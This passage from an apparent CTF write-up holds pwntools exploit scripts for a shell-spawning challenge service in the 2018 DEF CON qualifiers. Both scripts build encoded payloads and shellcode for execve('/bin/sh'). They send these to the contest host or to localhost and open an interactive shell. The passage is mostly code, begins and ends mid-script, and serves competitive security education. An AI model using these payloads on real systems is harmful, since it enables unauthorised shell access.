</span></span><span class=line><span class=cl><span class=c1>#Inserting 89 bf 90 90</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x8f\x00\xf4\x05</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x24\x00\x2b\x00</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x8f\x00\xf4\x05</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x8f\x00\xe7\x0b</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x24\x00\x55\x00</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x8f\x00\xe7\x0b</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x8f\x00\xce\x17</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x24\x00\xaa\x00</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x24\x00\x54\x01</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x8f\x00\xce\x17</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#Setting eax</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x8f\x00\x36\x5f</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x3b\x02\x54\x47\x36\x5f</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#Setting edx</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x36\x5f\x36\x5f</span><span class=s2>&#34;</span> <span class=o>*</span> <span class=mi>41</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#Padding</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x54\x47\x36\x5f</span><span class=s2>&#34;</span> <span class=o>*</span> <span class=mi>250</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#Terminator</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\x00\x00</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>solve_pow</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>with</span> <span class=n>context</span><span class=o>.</span><span class=n>local</span><span class=p>(</span><span class=n>log_level</span><span class=o>=</span><span class=s1>&#39;warning&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;our_1337_server&#39;</span><span class=p>,</span> <span class=mi>13337</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>s</span> <span class=o>+</span> <span class=s1>&#39; &#39;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>n</span><span class=p>))</span>
</span></span><span class=line><span class=cl>                <span class=n>res</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl>                <span class=n>r</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>res</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>connect</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;4e6b5b46.quals2018.oooverflow.io&#39;</span><span class=p>,</span> <span class=mi>31337</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Challenge: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>chall_s</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;n: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>chall_n</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>())</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>solve_pow</span><span class=p>(</span><span class=n>chall_s</span><span class=p>,</span> <span class=n>chall_n</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>r</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1>#conn = connect()</span>
</span></span><span class=line><span class=cl>        <span class=n>conn</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;127.0.0.1&#34;</span><span class=p>,</span> <span class=mi>4000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>conn</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;How does a shell sound?&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>conn</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>EOFError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>conn</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span></code></pre></div><h4 class="relative group">Second Exploit<div id=second-exploit class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#second-exploit aria-label=Anchor>#</a></span></h4><p>The second idea was to write the mask and <code>/bin/sh\0</code> in the <code>USER_INPUT</code> after <code>\xff\xff</code>. We would set <code>al</code> to the desired byte through xoring it with bytes on the stack via <code>edi</code> and xor al back into our nop sled pointed by <code>esi</code>.
This way we craft a shellcode in our nop sled.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>+=</span> <span class=n>asm</span><span class=p>(</span><span class=s2>&#34;nop&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>+=</span> <span class=n>asm</span><span class=p>(</span><span class=s2>&#34;nop&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>+=</span> <span class=n>asm</span><span class=p>(</span><span class=s2>&#34;nop&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>+=</span> <span class=n>asm</span><span class=p>(</span><span class=s2>&#34;nop&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>+=</span> <span class=n>asm</span><span class=p>(</span><span class=s2>&#34;xor eax, eax&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>+=</span> <span class=n>asm</span><span class=p>(</span><span class=s2>&#34;mov al, 0xb&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>+=</span> <span class=n>asm</span><span class=p>(</span><span class=s2>&#34;mov ebx, 0x40404e7c&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>+=</span> <span class=n>asm</span><span class=p>(</span><span class=s2>&#34;xor ecx, ecx&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>+=</span> <span class=n>asm</span><span class=p>(</span><span class=s2>&#34;xor edx, edx&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>+=</span> <span class=n>asm</span><span class=p>(</span><span class=s2>&#34;int 0x80&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># host = &#34;127.0.0.1&#34;</span>
</span></span><span class=line><span class=cl><span class=c1># port = 4000</span>
</span></span><span class=line><span class=cl><span class=n>host</span> <span class=o>=</span> <span class=s1>&#39;4e6b5b46.quals2018.oooverflow.io&#39;</span>
</span></span><span class=line><span class=cl><span class=n>port</span> <span class=o>=</span> <span class=mi>31337</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>MASK</span> <span class=o>=</span> <span class=mh>0x60606ff0</span>
</span></span><span class=line><span class=cl><span class=n>NOP</span> <span class=o>=</span> <span class=s2>&#34;F3F3&#34;</span> <span class=c1>#: [&#34;inc esi&#34;, &#34;xor eax, dword ptr [esi + 0x33]&#34;]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>n_to_f</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;G#1&#39;</span><span class=p>:</span> <span class=mi>101</span><span class=p>,</span> <span class=s1>&#39;G#0&#39;</span><span class=p>:</span> <span class=mi>51</span><span class=p>,</span> <span class=s1>&#39;G#3&#39;</span><span class=p>:</span> <span class=mi>404</span><span class=p>,</span> <span class=s1>&#39;G#2&#39;</span><span class=p>:</span> <span class=mi>202</span><span class=p>,</span> <span class=s1>&#39;G#5&#39;</span><span class=p>:</span> <span class=mi>1614</span><span class=p>,</span> <span class=s1>&#39;G#4&#39;</span><span class=p>:</span> <span class=mi>807</span><span class=p>,</span> <span class=s1>&#39;G#7&#39;</span><span class=p>:</span> <span class=mi>6456</span><span class=p>,</span> <span class=s1>&#39;G#6&#39;</span><span class=p>:</span> <span class=mi>3228</span><span class=p>,</span> <span class=s1>&#39;G#9&#39;</span><span class=p>:</span> <span class=mi>25823</span><span class=p>,</span> <span class=s1>&#39;G#8&#39;</span><span class=p>:</span> <span class=mi>12912</span><span class=p>,</span> <span class=s1>&#39;G7&#39;</span><span class=p>:</span> <span class=mi>6094</span><span class=p>,</span> <span class=s1>&#39;G6&#39;</span><span class=p>:</span> <span class=mi>3047</span><span class=p>,</span> <span class=s1>&#39;G5&#39;</span><span class=p>:</span> <span class=mi>1524</span><span class=p>,</span> <span class=s1>&#39;G4&#39;</span><span class=p>:</span> <span class=mi>762</span><span class=p>,</span> <span class=s1>&#39;G3&#39;</span><span class=p>:</span> <span class=mi>381</span><span class=p>,</span> <span class=s1>&#39;G2&#39;</span><span class=p>:</span> <span class=mi>191</span><span class=p>,</span> <span class=s1>&#39;G1&#39;</span><span class=p>:</span> <span class=mi>96</span><span class=p>,</span> <span class=s1>&#39;G0&#39;</span><span class=p>:</span> <span class=mi>48</span><span class=p>,</span> <span class=s1>&#39;G9&#39;</span><span class=p>:</span> <span class=mi>24374</span><span class=p>,</span> <span class=s1>&#39;G8&#39;</span><span class=p>:</span> <span class=mi>12187</span><span class=p>,</span> <span class=s1>&#39;D#8&#39;</span><span class=p>:</span> <span class=mi>9673</span><span class=p>,</span> <span class=s1>&#39;D#9&#39;</span><span class=p>:</span> <span class=mi>19346</span><span class=p>,</span> <span class=s1>&#39;D#6&#39;</span><span class=p>:</span> <span class=mi>2419</span><span class=p>,</span> <span class=s1>&#39;A8&#39;</span><span class=p>:</span> <span class=mi>6840</span><span class=p>,</span> <span class=s1>&#39;B4&#39;</span><span class=p>:</span> <span class=mi>480</span><span class=p>,</span> <span class=s1>&#39;B5&#39;</span><span class=p>:</span> <span class=mi>960</span><span class=p>,</span> <span class=s1>&#39;B6&#39;</span><span class=p>:</span> <span class=mi>1920</span><span class=p>,</span> <span class=s1>&#39;B7&#39;</span><span class=p>:</span> <span class=mi>3839</span><span class=p>,</span> <span class=s1>&#39;B0&#39;</span><span class=p>:</span> <span class=mi>30</span><span class=p>,</span> <span class=s1>&#39;B1&#39;</span><span class=p>:</span> <span class=mi>60</span><span class=p>,</span> <span class=s1>&#39;B2&#39;</span><span class=p>:</span> <span class=mi>120</span><span class=p>,</span> <span class=s1>&#39;B3&#39;</span><span class=p>:</span> <span class=mi>240</span><span class=p>,</span> <span class=s1>&#39;B8&#39;</span><span class=p>:</span> <span class=mi>7678</span><span class=p>,</span> <span class=s1>&#39;B9&#39;</span><span class=p>:</span> <span class=mi>15355</span><span class=p>,</span> <span class=s1>&#39;F#0&#39;</span><span class=p>:</span> <span class=mi>45</span><span class=p>,</span> <span class=s1>&#39;F#1&#39;</span><span class=p>:</span> <span class=mi>90</span><span class=p>,</span> <span class=s1>&#39;F#2&#39;</span><span class=p>:</span> <span class=mi>180</span><span class=p>,</span> <span class=s1>&#39;F#3&#39;</span><span class=p>:</span> <span class=mi>360</span><span class=p>,</span> <span class=s1>&#39;F#4&#39;</span><span class=p>:</span> <span class=mi>719</span><span class=p>,</span> <span class=s1>&#39;F#5&#39;</span><span class=p>:</span> <span class=mi>1438</span><span class=p>,</span> <span class=s1>&#39;F#6&#39;</span><span class=p>:</span> <span class=mi>2876</span><span class=p>,</span> <span class=s1>&#39;F#7&#39;</span><span class=p>:</span> <span class=mi>5752</span><span class=p>,</span> <span class=s1>&#39;F#8&#39;</span><span class=p>:</span> <span class=mi>11503</span><span class=p>,</span> <span class=s1>&#39;F#9&#39;</span><span class=p>:</span> <span class=mi>23006</span><span class=p>,</span> <span class=s1>&#39;E9&#39;</span><span class=p>:</span> <span class=mi>20496</span><span class=p>,</span> <span class=s1>&#39;E8&#39;</span><span class=p>:</span> <span class=mi>10248</span><span class=p>,</span> <span class=s1>&#39;E5&#39;</span><span class=p>:</span> <span class=mi>1281</span><span class=p>,</span> <span class=s1>&#39;E4&#39;</span><span class=p>:</span> <span class=mi>641</span><span class=p>,</span> <span class=s1>&#39;E7&#39;</span><span class=p>:</span> <span class=mi>5124</span><span class=p>,</span> <span class=s1>&#39;E6&#39;</span><span class=p>:</span> <span class=mi>2562</span><span class=p>,</span> <span class=s1>&#39;E1&#39;</span><span class=p>:</span> <span class=mi>81</span><span class=p>,</span> <span class=s1>&#39;E0&#39;</span><span class=p>:</span> <span class=mi>41</span><span class=p>,</span> <span class=s1>&#39;E3&#39;</span><span class=p>:</span> <span class=mi>321</span><span class=p>,</span> <span class=s1>&#39;E2&#39;</span><span class=p>:</span> <span class=mi>161</span><span class=p>,</span> <span class=s1>&#39;A#3&#39;</span><span class=p>:</span> <span class=mi>227</span><span class=p>,</span> <span class=s1>&#39;A#2&#39;</span><span class=p>:</span> <span class=mi>114</span><span class=p>,</span> <span class=s1>&#39;A#1&#39;</span><span class=p>:</span> <span class=mi>57</span><span class=p>,</span> <span class=s1>&#39;A#0&#39;</span><span class=p>:</span> <span class=mi>29</span><span class=p>,</span> <span class=s1>&#39;A#7&#39;</span><span class=p>:</span> <span class=mi>3624</span><span class=p>,</span> <span class=s1>&#39;A#6&#39;</span><span class=p>:</span> <span class=mi>1812</span><span class=p>,</span> <span class=s1>&#39;A#5&#39;</span><span class=p>:</span> <span class=mi>906</span><span class=p>,</span> <span class=s1>&#39;A#4&#39;</span><span class=p>:</span> <span class=mi>453</span><span class=p>,</span> <span class=s1>&#39;A#9&#39;</span><span class=p>:</span> <span class=mi>14493</span><span class=p>,</span> <span class=s1>&#39;A#8&#39;</span><span class=p>:</span> <span class=mi>7247</span><span class=p>,</span> <span class=s1>&#39;C9&#39;</span><span class=p>:</span> <span class=mi>16268</span><span class=p>,</span> <span class=s1>&#39;C8&#39;</span><span class=p>:</span> <span class=mi>8134</span><span class=p>,</span> <span class=s1>&#39;C3&#39;</span><span class=p>:</span> <span class=mi>255</span><span class=p>,</span> <span class=s1>&#39;C2&#39;</span><span class=p>:</span> <span class=mi>128</span><span class=p>,</span> <span class=s1>&#39;C1&#39;</span><span class=p>:</span> <span class=mi>64</span><span class=p>,</span> <span class=s1>&#39;C0&#39;</span><span class=p>:</span> <span class=mi>32</span><span class=p>,</span> <span class=s1>&#39;C7&#39;</span><span class=p>:</span> <span class=mi>4067</span><span class=p>,</span> <span class=s1>&#39;C6&#39;</span><span class=p>:</span> <span class=mi>2034</span><span class=p>,</span> <span class=s1>&#39;C5&#39;</span><span class=p>:</span> <span class=mi>1017</span><span class=p>,</span> <span class=s1>&#39;C4&#39;</span><span class=p>:</span> <span class=mi>509</span><span class=p>,</span> <span class=s1>&#39;F0&#39;</span><span class=p>:</span> <span class=mi>43</span><span class=p>,</span> <span class=s1>&#39;F1&#39;</span><span class=p>:</span> <span class=mi>85</span><span class=p>,</span> <span class=s1>&#39;F2&#39;</span><span class=p>:</span> <span class=mi>170</span><span class=p>,</span> <span class=s1>&#39;F3&#39;</span><span class=p>:</span> <span class=mi>340</span><span class=p>,</span> <span class=s1>&#39;F4&#39;</span><span class=p>:</span> <span class=mi>679</span><span class=p>,</span> <span class=s1>&#39;F5&#39;</span><span class=p>:</span> <span class=mi>1358</span><span class=p>,</span> <span class=s1>&#39;F6&#39;</span><span class=p>:</span> <span class=mi>2715</span><span class=p>,</span> <span class=s1>&#39;F7&#39;</span><span class=p>:</span> <span class=mi>5429</span><span class=p>,</span> <span class=s1>&#39;F8&#39;</span><span class=p>:</span> <span class=mi>10858</span><span class=p>,</span> <span class=s1>&#39;F9&#39;</span><span class=p>:</span> <span class=mi>21715</span><span class=p>,</span> <span class=s1>&#39;A1&#39;</span><span class=p>:</span> <span class=mi>54</span><span class=p>,</span> <span class=s1>&#39;A0&#39;</span><span class=p>:</span> <span class=mi>27</span><span class=p>,</span> <span class=s1>&#39;A3&#39;</span><span class=p>:</span> <span class=mi>214</span><span class=p>,</span> <span class=s1>&#39;A2&#39;</span><span class=p>:</span> <span class=mi>107</span><span class=p>,</span> <span class=s1>&#39;A5&#39;</span><span class=p>:</span> <span class=mi>855</span><span class=p>,</span> <span class=s1>&#39;A4&#39;</span><span class=p>:</span> <span class=mi>428</span><span class=p>,</span> <span class=s1>&#39;A7&#39;</span><span class=p>:</span> <span class=mi>3420</span><span class=p>,</span> <span class=s1>&#39;A6&#39;</span><span class=p>:</span> <span class=mi>1710</span><span class=p>,</span> <span class=s1>&#39;A9&#39;</span><span class=p>:</span> <span class=mi>13680</span><span class=p>,</span> <span class=s1>&#39;D#7&#39;</span><span class=p>:</span> <span class=mi>4837</span><span class=p>,</span> <span class=s1>&#39;D#4&#39;</span><span class=p>:</span> <span class=mi>605</span><span class=p>,</span> <span class=s1>&#39;D#5&#39;</span><span class=p>:</span> <span class=mi>1210</span><span class=p>,</span> <span class=s1>&#39;D#2&#39;</span><span class=p>:</span> <span class=mi>152</span><span class=p>,</span> <span class=s1>&#39;D#3&#39;</span><span class=p>:</span> <span class=mi>303</span><span class=p>,</span> <span class=s1>&#39;D#0&#39;</span><span class=p>:</span> <span class=mi>38</span><span class=p>,</span> <span class=s1>&#39;D#1&#39;</span><span class=p>:</span> <span class=mi>76</span><span class=p>,</span> <span class=s1>&#39;C#9&#39;</span><span class=p>:</span> <span class=mi>17235</span><span class=p>,</span> <span class=s1>&#39;C#8&#39;</span><span class=p>:</span> <span class=mi>8618</span><span class=p>,</span> <span class=s1>&#39;C#5&#39;</span><span class=p>:</span> <span class=mi>1078</span><span class=p>,</span> <span class=s1>&#39;C#4&#39;</span><span class=p>:</span> <span class=mi>539</span><span class=p>,</span> <span class=s1>&#39;C#7&#39;</span><span class=p>:</span> <span class=mi>4309</span><span class=p>,</span> <span class=s1>&#39;C#6&#39;</span><span class=p>:</span> <span class=mi>2155</span><span class=p>,</span> <span class=s1>&#39;C#1&#39;</span><span class=p>:</span> <span class=mi>68</span><span class=p>,</span> <span class=s1>&#39;C#0&#39;</span><span class=p>:</span> <span class=mi>34</span><span class=p>,</span> <span class=s1>&#39;C#3&#39;</span><span class=p>:</span> <span class=mi>270</span><span class=p>,</span> <span class=s1>&#39;C#2&#39;</span><span class=p>:</span> <span class=mi>135</span><span class=p>,</span> <span class=s1>&#39;D8&#39;</span><span class=p>:</span> <span class=mi>9130</span><span class=p>,</span> <span class=s1>&#39;D9&#39;</span><span class=p>:</span> <span class=mi>18260</span><span class=p>,</span> <span class=s1>&#39;D6&#39;</span><span class=p>:</span> <span class=mi>2283</span><span class=p>,</span> <span class=s1>&#39;D7&#39;</span><span class=p>:</span> <span class=mi>4565</span><span class=p>,</span> <span class=s1>&#39;D4&#39;</span><span class=p>:</span> <span class=mi>571</span><span class=p>,</span> <span class=s1>&#39;D5&#39;</span><span class=p>:</span> <span class=mi>1142</span><span class=p>,</span> <span class=s1>&#39;D2&#39;</span><span class=p>:</span> <span class=mi>143</span><span class=p>,</span> <span class=s1>&#39;D3&#39;</span><span class=p>:</span> <span class=mi>286</span><span class=p>,</span> <span class=s1>&#39;D0&#39;</span><span class=p>:</span> <span class=mi>36</span><span class=p>,</span> <span class=s1>&#39;D1&#39;</span><span class=p>:</span> <span class=mi>72</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>encoder</span><span class=p>(</span><span class=n>note</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=nb>len</span><span class=p>(</span><span class=n>note</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>i</span><span class=o>+</span><span class=mi>2</span> <span class=o>&lt;=</span> <span class=nb>len</span><span class=p>(</span><span class=n>note</span><span class=p>)</span> <span class=ow>and</span> <span class=n>note</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=mi>2</span><span class=p>]</span> <span class=ow>in</span> <span class=n>n_to_f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span> <span class=o>+=</span> <span class=n>p16</span><span class=p>(</span><span class=n>n_to_f</span><span class=p>[</span><span class=n>note</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=mi>2</span><span class=p>]])</span>
</span></span><span class=line><span class=cl>            <span class=n>i</span> <span class=o>+=</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>i</span><span class=o>+</span><span class=mi>3</span> <span class=o>&lt;=</span> <span class=nb>len</span><span class=p>(</span><span class=n>note</span><span class=p>)</span> <span class=ow>and</span> <span class=n>note</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=mi>3</span><span class=p>]</span> <span class=ow>in</span> <span class=n>n_to_f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span> <span class=o>+=</span> <span class=n>p16</span><span class=p>(</span><span class=n>n_to_f</span><span class=p>[</span><span class=n>note</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=mi>3</span><span class=p>]])</span>
</span></span><span class=line><span class=cl>            <span class=n>i</span> <span class=o>+=</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span> <span class=k>raise</span> <span class=ne>RuntimeError</span><span class=p>(</span><span class=s2>&#34;fuuuuuuuuuuuuuuuck &#34;</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>r</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>pow_hash</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span> <span class=n>solution</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>sha256</span><span class=p>(</span><span class=n>challenge</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;ascii&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;Q&#39;</span><span class=p>,</span> <span class=n>solution</span><span class=p>))</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>check_pow</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span> <span class=n>n</span><span class=p>,</span> <span class=n>solution</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>h</span> <span class=o>=</span> <span class=n>pow_hash</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span> <span class=n>solution</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>h</span><span class=p>,</span> <span class=mi>16</span><span class=p>)</span> <span class=o>%</span> <span class=p>(</span><span class=mi>2</span><span class=o>**</span><span class=n>n</span><span class=p>))</span> <span class=o>==</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>solve_pow</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span> <span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>candidate</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>check_pow</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span> <span class=n>n</span><span class=p>,</span> <span class=n>candidate</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>candidate</span>
</span></span><span class=line><span class=cl>        <span class=n>candidate</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># set eax to 0x40404e78 -&gt; 0x60607bf7</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>encoder</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=s1>&#39;G8&#39;</span><span class=p>,</span> <span class=s1>&#39;G5&#39;</span><span class=p>,</span> <span class=s1>&#39;G8&#39;</span><span class=p>,</span> <span class=s1>&#39;G5&#39;</span><span class=p>,</span> <span class=s1>&#39;G8&#39;</span><span class=p>,</span> <span class=s1>&#39;G5&#39;</span><span class=p>,</span> <span class=s1>&#39;G8&#39;</span><span class=p>,</span> <span class=s1>&#39;G5&#39;</span><span class=p>,</span> <span class=s1>&#39;G8&#39;</span><span class=p>,</span> <span class=s1>&#39;G5&#39;</span><span class=p>,</span> <span class=s1>&#39;G8&#39;</span><span class=p>,</span> <span class=s1>&#39;G5&#39;</span><span class=p>,</span> <span class=s1>&#39;G8&#39;</span><span class=p>,</span> <span class=s1>&#39;G5&#39;</span><span class=p>,</span> <span class=s1>&#39;G8&#39;</span><span class=p>,</span> <span class=s1>&#39;G5&#39;</span><span class=p>,</span> <span class=s1>&#39;G8&#39;</span><span class=p>,</span> <span class=s1>&#39;G5&#39;</span><span class=p>,</span> <span class=s1>&#39;G8&#39;</span><span class=p>,</span> <span class=s1>&#39;G5&#39;</span><span class=p>,</span> <span class=s1>&#39;G8&#39;</span><span class=p>,</span> <span 